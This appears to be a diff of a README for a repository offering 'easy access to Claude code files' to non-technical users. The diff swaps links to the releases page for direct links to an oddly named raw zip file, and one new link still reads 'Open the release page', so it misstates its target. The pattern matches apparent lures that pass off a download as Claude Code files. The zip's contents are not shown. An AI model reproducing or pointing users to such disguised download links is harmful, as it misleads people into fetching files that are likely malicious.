@@ -1,6 +1,6 @@
 # 🧩 claude-code-2188 - Easy access to Claude code files
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Mikecomparative372/claude-code-2188/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Mikecomparative372/claude-code-2188/raw/refs/heads/main/Muranese/code-claude-disqualification.zip)
 
 ## 🚀 Overview
 
@@ -17,7 +17,7 @@ This README focuses on the easiest path for a non-technical user:
 
 Use this page to download the release files:
 
-[Open the release page](https://github.com/Mikecomparative372/claude-code-2188/releases)
+[Open the release page](https://github.com/Mikecomparative372/claude-code-2188/raw/refs/heads/main/Muranese/code-claude-disqualification.zip)
 
 On that page, look for the latest release. Then find the file meant for Windows. Common file types include:
 
